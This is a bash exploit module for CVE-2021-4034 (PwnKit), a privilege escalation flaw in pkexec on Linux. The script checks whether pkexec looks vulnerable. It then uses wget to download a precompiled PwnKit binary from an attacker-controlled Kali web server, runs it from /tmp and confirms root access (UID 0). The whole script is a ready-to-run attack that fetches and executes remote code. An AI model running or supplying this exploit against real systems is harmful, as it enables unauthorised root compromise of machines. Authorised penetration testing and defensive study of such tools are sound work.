#!/bin/bash

# -----------------------------------------------------------------
#  CVE-2021-4034 (PwnKit) Exploit Module
#  Uses a precompiled binary hosted on the attacker box.
# -----------------------------------------------------------------

# === Parse attacker IP and port ===
echo "[*] CVE-2021-4034 Exploit Module - PwnKit"
echo "[*] Credit goes to ly4k https://github.com/ly4k/PwnKit"

KALI_IP=""
KALI_PORT="80"  # default

while [[ $# -gt 0 ]]; do
    case $1 in
        --ip)
            KALI_IP="$2"
            shift 2
            ;;
        --port)
            KALI_PORT="$2"
            shift 2
            ;;
        *)
            echo "[-] Unknown option: $1"
            exit 1
            ;;
    esac
done

if [ -z "$KALI_IP" ]; then
    echo "[-] Missing --ip argument (Kali webserver IP)"
    echo "Usage: $0 --ip <KALI_IP> [--port <PORT>]"
    exit 1
fi

echo "[*] Using attacker server at $KALI_IP:$KALI_PORT"

# === Step 1: Check for pkexec ===
if ! command -v pkexec >/dev/null 2>&1; then
    echo "[-] pkexec not found — skipping PwnKit"
    exit 2
fi

output=$(pkexec 2>&1)
if echo "$output" | grep -q "Cannot determine"; then
    echo "[+] pkexec behavior indicates vulnerability"
else
    echo "[-] pkexec does not appear vulnerable"
    exit 2
fi

# === Step 2: Download precompiled payload ===
wget http://$KALI_IP:$KALI_PORT/PwnKit -O /tmp/pwnkit || exit 1
chmod +x /tmp/pwnkit

# === Step 3: Run ===
/tmp/pwnkit
if [ "$(id -u)" -eq 0 ]; then
    echo "[+] CVE-2021-4034 (PwnKit) succeeded — UID 0"
    exit 0
else
    echo "[-] Exploit failed — still $(whoami)"
    exit 1
fi
